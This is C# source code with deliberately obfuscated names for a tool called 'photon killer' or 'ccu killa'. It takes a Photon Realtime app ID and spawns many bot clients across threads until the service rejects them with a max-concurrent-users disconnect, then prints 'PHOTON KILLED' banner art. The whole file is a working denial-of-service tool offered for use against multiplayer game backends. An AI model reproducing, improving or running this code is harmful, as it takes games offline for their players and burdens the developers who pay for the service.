// this is just the source code of it.

using System;
using System.Collections.Generic;
using System.Threading;
using System.Threading.Tasks;
using Photon.Realtime;
namespace jUFrf
{
class aBcDe:IConnectionCallbacks
{
private LoadBalancingClient? fGhiJ;
private string? kLmNo;
private readonly List<LoadBalancingClient> pQrSt=new List<LoadBalancingClient>();
private readonly object uVwXy=new object();
public CancellationTokenSource? xYzAb;
static async Task Main(string[] zAbCd)
{
aBcDe eFgHi=new aBcDe();
await eFgHi.jKlMn();
}
public async Task jKlMn()
{
Console.Title="ccu killa";
oPqRs("started");
kLmNo=tUvWx("put realtime id here");
if(string.IsNullOrEmpty(kLmNo))
{
oPqRs("cannot be null");
return;
}
fGhiJ=new LoadBalancingClient();
fGhiJ.AddCallbackTarget(this);
fGhiJ.AppId=kLmNo;
bool yZaBc=true;
while(yZaBc)
{
Console.Clear();
Console.WriteLine("thingys photon killer");
Console.WriteLine("1. ccu kill");
Console.WriteLine("2. close");
Console.Write("\nselect ");
string dEfGh=Console.ReadLine();
switch(dEfGh)
{
case "1":
await iJklM();
break;
case "2":
yZaBc=false;
break;
default:
Console.WriteLine("invalid selection");
Console.ReadKey();
break;
}
}
}
private async Task iJklM()
{
if(string.IsNullOrEmpty(kLmNo))return;
Console.Clear();
Console.Write("how many players to spawn/kill it");
if(!int.TryParse(Console.ReadLine(),out int nOpQr)||nOpQr<=0)
{
oPqRs("invalid number");
Console.ReadKey();
return;
}
int sTuvW=1;
if(nOpQr>=10&&nOpQr<20)
{
sTuvW=2;
}
else if(nOpQr>=20&&nOpQr<100)
{
sTuvW=10;
}
else if(nOpQr>=100)
{
sTuvW=20;
}
oPqRs($"spawning {nOpQr} players using {sTuvW} threads");
oPqRs("press c to stop\n");
xYzAb=new CancellationTokenSource();
int cDeFg=0;
Task hIjKl=Task.Run(()=>
{
while(!xYzAb.Token.IsCancellationRequested)
{
if(Console.KeyAvailable&&Console.ReadKey(true).Key==ConsoleKey.C)
{
xYzAb.Cancel();
break;
}
Thread.Sleep(100);
}
});
Task mNoPq=Task.Run(async()=>
{
while(!xYzAb.Token.IsCancellationRequested)
{
lock(uVwXy)
{
foreach(var rStUv in pQrSt)
{
rStUv.Service();
}
}
await Task.Delay(100);
}
});
List<Task> wXyZa=new List<Task>();
for(int bCdEf=0;bCdEf<sTuvW;bCdEf++)
{
wXyZa.Add(Task.Run(async()=>
{
while(!xYzAb.Token.IsCancellationRequested)
{
int gHiJk;
lock(uVwXy)
{
if(cDeFg>=nOpQr)
{
xYzAb.Cancel();
break;
}
cDeFg++;
gHiJk=cDeFg;
}
try
{
string lMnOp=$"bot_{Guid.NewGuid().ToString().Substring(0, 8)}";
if(xYzAb.Token.IsCancellationRequested)break;
oPqRs($"thread {Task.CurrentId} killing ccu #{gHiJk}/{nOpQr} ({lMnOp})");
LoadBalancingClient qRsTt=new LoadBalancingClient
{
AppId=kLmNo,
UserId=lMnOp
};
uVwXyZ aBcDeF=new uVwXyZ(lMnOp,this);
qRsTt.AddCallbackTarget(aBcDeF);
if(qRsTt.ConnectToRegionMaster("us"))
{
lock(uVwXy)
{
pQrSt.Add(qRsTt);
}
for(int j=0;j<10;j++)
{
if(xYzAb.Token.IsCancellationRequested)break;
qRsTt.Service();
await Task.Delay(50);
}
}
else
{
if(!xYzAb.Token.IsCancellationRequested)oPqRs($"{lMnOp} failed");
}
}
catch(Exception gHiJkL)
{
if(!xYzAb.Token.IsCancellationRequested)oPqRs($"failed to kill {gHiJkL.Message}");
}
await Task.Delay(500);
}
}));
}
await hIjKl;
await Task.WhenAll(wXyZa);
await mNoPq;
Console.WriteLine();
oPqRs("finished killing");
lock(uVwXy)
{
foreach(var rStUv in pQrSt)
{
if(rStUv.IsConnected)
{
rStUv.Disconnect();
}
}
pQrSt.Clear();
}
oPqRs("stopped");
Console.WriteLine("\npress any key to go back");
Console.ReadKey();
}
private string tUvWx(string yZaBc)
{
Console.Write($"{yZaBc} ");
return Console.ReadLine()??string.Empty;
}
public void oPqRs(string dEfGh)
{
if(xYzAb!=null&&xYzAb.Token.IsCancellationRequested&&!dEfGh.Contains("Photon Killed"))return;
string hIjKl=$"[{DateTime.Now:HH:mm:ss}] {dEfGh}";
Console.WriteLine(hIjKl);
}
public void OnConnected()
{
oPqRs("connected to photon");
}
public void OnConnectedToMaster()
{
oPqRs("connected to master");
}
public void OnDisconnected(DisconnectCause mNoPq)
{
oPqRs($"disconnected reason {mNoPq}");
}
public void OnRegionListReceived(RegionHandler rStUv){}
public void OnCustomAuthenticationResponse(Dictionary<string,object> wXyZa){}
public void OnCustomAuthenticationFailed(string bCdEf){}
}
class uVwXyZ:IConnectionCallbacks
{
private readonly string gHiJk;
private readonly aBcDe lMnOp;
public uVwXyZ(string qRsTt,aBcDe uVwXy)
{
gHiJk=qRsTt;
lMnOp=uVwXy;
}
public void OnConnectedToMaster()
{
lMnOp.oPqRs($"worked {gHiJk} successfully connected to ccu");
}
public void OnDisconnected(DisconnectCause zAbCd)
{
if(zAbCd==DisconnectCause.MaxCcuReached)
{
if(lMnOp.xYzAb!=null&&!lMnOp.xYzAb.Token.IsCancellationRequested)
{
lMnOp.xYzAb.Cancel();
Console.WriteLine("\n██████╗ ██╗  ██╗ ██████╗ ████████╗ ██████╗ ███╗   ██╗    ██╗  ██╗██╗██╗     ██╗     ███████╗██████╗ \r\n██╔══██╗██║  ██║██╔═══██╗╚══██╔══╝██╔═══██╗████╗  ██║    ██║ ██╔╝██║██║     ██║     ██╔════╝██╔══██╗\r\n██████╔╝███████║██║   ██║   ██║   ██║   ██║██╔██╗ ██║    █████╔╝ ██║██║     ██║     █████╗  ██║  ██║\r\n██╔═══╝ ██╔══██║██║   ██║   ██║   ██║   ██║██║╚██╗██║    ██╔═██╗ ██║██║     ██║     ██╔══╝  ██║  ██║\r\n██║     ██║  ██║╚██████╔╝   ██║   ╚██████╔╝██║ ╚████║    ██║  ██╗██║███████╗███████╗███████╗██████╔╝\r\n╚═╝     ╚═╝  ╚═╝ ╚═════╝    ╚═╝    ╚═════╝ ╚═╝  ╚═══╝    ╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚══════╝╚═════╝ \r\n                                                                                                    \n");
lMnOp.oPqRs("killer ended early due to photon being killed");
}
return;
}
if(zAbCd!=DisconnectCause.DisconnectByClientLogic)
{
lMnOp.oPqRs($"failed {gHiJk} reason {zAbCd}");
}
}
public void OnConnected(){}
public void OnRegionListReceived(RegionHandler eFgHi){}
public void OnCustomAuthenticationResponse(Dictionary<string,object> jKlMn){}
public void OnCustomAuthenticationFailed(string oPqRs){}
}
}
